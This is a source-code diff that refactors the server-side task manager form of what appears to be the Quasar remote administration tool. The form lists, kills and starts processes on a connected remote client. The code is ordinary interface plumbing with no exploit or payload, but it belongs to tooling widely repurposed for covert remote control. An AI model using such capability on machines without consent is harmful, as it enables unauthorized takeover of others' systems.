@@ -1,6 +1,10 @@
-﻿using System;
+﻿using Quasar.Common.Messages;
+using Quasar.Common.Models;
+using System;
+using System.Collections.Generic;
 using System.Windows.Forms;
 using xServer.Controls;
+using xServer.Core.Commands;
 using xServer.Core.Helper;
 using xServer.Core.Networking;
 
@@ -8,109 +12,132 @@ namespace xServer.Forms
 {
     public partial class FrmTaskManager : Form
     {
+        /// <summary>
+        /// The client which can be used for the task manager.
+        /// </summary>
         private readonly Client _connectClient;
 
-        public FrmTaskManager(Client c)
-        {
-            _connectClient = c;
-            _connectClient.Value.FrmTm = this;
+        /// <summary>
+        /// The message handler for handling the communication with the client.
+        /// </summary>
+        private readonly TaskManagerHandler _taskManagerHandler;
 
+        /// <summary>
+        /// Holds the opened task manager form for each client.
+        /// </summary>
+        private static readonly Dictionary<Client, FrmTaskManager> OpenedForms = new Dictionary<Client, FrmTaskManager>();
+
+        /// <summary>
+        /// Creates a new task manager form for the client or gets the current open form, if there exists one already.
+        /// </summary>
+        /// <param name="client">The client used for the task manager form.</param>
+        /// <returns>
+        /// Returns a new task manager form for the client if there is none currently open, otherwise creates a new one.
+        /// </returns>
+        public static FrmTaskManager CreateNewOrGetExisting(Client client)
+        {
+            if (OpenedForms.ContainsKey(client))
+            {
+                return OpenedForms[client];
+            }
+            FrmTaskManager f = new FrmTaskManager(client);
+            f.Disposed += (sender, args) => OpenedForms.Remove(client);
+            OpenedForms.Add(client, f);
+            return f;
+        }
+
+        /// <summary>
+        /// Initializes a new instance of the <see cref="FrmTaskManager"/> class using the given client.
+        /// </summary>
+        /// <param name="client">The client used for the task manager form.</param>
+        public FrmTaskManager(Client client)
+        {
+            _connectClient = client;
+            _taskManagerHandler = new TaskManagerHandler(client);
+
+            RegisterMessageHandler();
             InitializeComponent();
+        }
+
+        /// <summary>
+        /// Registers the task manager message handler for client communication.
+        /// </summary>
+        private void RegisterMessageHandler()
+        {
+            _connectClient.ClientState += ClientDisconnected;
+            _taskManagerHandler.ProgressChanged += TasksChanged;
+            MessageHandler.Register(_taskManagerHandler);
+        }
+
+        /// <summary>
+        /// Unregisters the task manager message handler.
+        /// </summary>
+        private void UnregisterMessageHandler()
+        {
+            MessageHandler.Unregister(_taskManagerHandler);
+            _taskManagerHandler.ProgressChanged -= TasksChanged;
+            _connectClient.ClientState -= ClientDisconnected;
+        }
+
+        /// <summary>
+        /// Called whenever a client disconnects.
+        /// </summary>
+        /// <param name="client">The client which disconnected.</param>
+        /// <param name="connected">True if the client connected, false if disconnected</param>
+        private void ClientDisconnected(Client client, bool connected)
+        {
+            if (!connected)
+            {
+                this.Invoke((MethodInvoker)this.Close);
+            }
+        }
+
+        private void TasksChanged(object sender, Process[] processes)
+        {
+            lstTasks.Items.Clear();
+
+            foreach (var process in processes)
+            {
+                ListViewItem lvi =
+                    new ListViewItem(new[] {process.Name, process.Id.ToString(), process.MainWindowTitle});
+                lstTasks.Items.Add(lvi);
+            }
+
+            processesToolStripStatusLabel.Text = $"Processes: {processes.Length}";
         }
 
         private void FrmTaskManager_Load(object sender, EventArgs e)
         {
-            if (_connectClient != null)
-            {
-                this.Text = WindowHelper.GetWindowTitle("Task Manager", _connectClient);
-                new Core.Packets.ServerPackets.GetProcesses().Execute(_connectClient);
-            }
+            this.Text = WindowHelper.GetWindowTitle("Task Manager", _connectClient);
+            _taskManagerHandler.RefreshProcesses();
         }
 
         private void FrmTaskManager_FormClosing(object sender, FormClosingEventArgs e)
         {
-            if (_connectClient.Value != null)
-                _connectClient.Value.FrmTm = null;
+            UnregisterMessageHandler();
+            _taskManagerHandler.Dispose();
         }
-
-        #region "ContextMenuStrip"
 
         private void killProcessToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (_connectClient != null)
+            foreach (ListViewItem lvi in lstTasks.SelectedItems)
             {
-                foreach (ListViewItem lvi in lstTasks.SelectedItems)
-                {
-                    new Core.Packets.ServerPackets.DoProcessKill(int.Parse(lvi.SubItems[1].Text)).Execute(_connectClient);
-                }
+                _taskManagerHandler.EndProcess(int.Parse(lvi.SubItems[1].Text));
             }
         }
 
         private void startProcessToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            string processname = string.Empty;
-            if (InputBox.Show("Processname", "Enter Processname:", ref processname) == DialogResult.OK)
+            string processName = string.Empty;
+            if (InputBox.Show("Process name", "Enter Process name:", ref processName) == DialogResult.OK)
             {
-                if (_connectClient != null)
-                    new Core.Packets.ServerPackets.DoProcessStart(processname).Execute(_connectClient);
+                _taskManagerHandler.StartProcess(processName);
             }
         }
 
         private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (_connectClient != null)
-            {
-                new Core.Packets.ServerPackets.GetProcesses().Execute(_connectClient);
-            }
-        }
-
-        #endregion
-
-        public void ClearListviewItems()
-        {
-            try
-            {
-                lstTasks.Invoke((MethodInvoker)delegate
-                {
-                    lstTasks.Items.Clear();
-                });
-            }
-            catch (InvalidOperationException)
-            {
-            }
-        }
-
-        public void AddProcessToListview(string processName, int pid, string windowTitle)
-        {
-            try
-            {
-                ListViewItem lvi = new ListViewItem(new string[]
-                {
-                    processName, pid.ToString(), windowTitle
-                });
-
-                lstTasks.Invoke((MethodInvoker)delegate
-                {
-                    lstTasks.Items.Add(lvi);
-                });
-            }
-            catch (InvalidOperationException)
-            {
-            }
-        }
-
-        public void SetProcessesCount(int processesCount)
-        {
-            try
-            {
-                statusStrip.Invoke((MethodInvoker) delegate
-                {
-                    processesToolStripStatusLabel.Text = "Processes: " + processesCount.ToString();
-                });
-            }
-            catch (InvalidOperationException)
-            {
-            }
+            _taskManagerHandler.RefreshProcesses();
         }
     }
 }
